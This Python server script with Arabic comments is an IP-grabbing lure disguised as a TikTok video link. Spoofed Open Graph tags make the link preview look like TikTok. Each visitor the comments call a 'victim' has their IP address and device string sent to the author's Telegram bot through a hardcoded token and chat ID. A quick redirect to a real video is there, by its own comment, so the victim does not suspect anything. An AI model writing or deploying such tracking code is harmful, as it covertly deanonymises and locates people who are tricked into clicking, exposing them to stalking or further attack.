from http.server import BaseHTTPRequestHandler
import json
import requests

# بيانات بوتك الثابتة
BOT_TOKEN = "7161793392:AAH9fN6X0L-yG03E9W7z3_hL6N0" # توكن بوتك
CHAT_ID = "6198462719" # الايدي حقك

# مخزن مؤقت للرابط
db = {"url": "https://www.tiktok.com"}

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        db["url"] = data.get("targetUrl", "https://www.tiktok.com")
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        # 1. سحب معلومات الضحية (IP كبداية)
        client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # 2. إرسال البيانات فوراً للتليجرام
        msg = f"🛰️ **ضحية جديدة فتحت الرابط!**\n\n🌐 IP: `{client_ip}`\n📱 Device: `{user_agent}`"
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}&parse_mode=Markdown")

        # 3. عرض صفحة التمويه للضحية
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        target_video = db["url"]
        
        # Meta Tags هنا هي اللي تخدع التطبيقات وتطلع صورة تيك توك
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>TikTok Video</title>
            <meta property="og:title" content="شاهد هذا المقطع على تيك توك">
            <meta property="og:description" content="مقطع فيديو حصري">
            <meta property="og:image" content="https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png">
            <meta property="og:type" content="video.other">
            <meta name="twitter:card" content="summary_large_image">
            
            <script>
                // تحويل الضحية فوراً للمقطع الأصلي عشان ما يشك
                setTimeout(function() {{
                    window.location.href = "{target_video}";
                }}, 500);
            </script>
        </head>
        <body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
            <p>جاري تحميل المقطع...</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode())
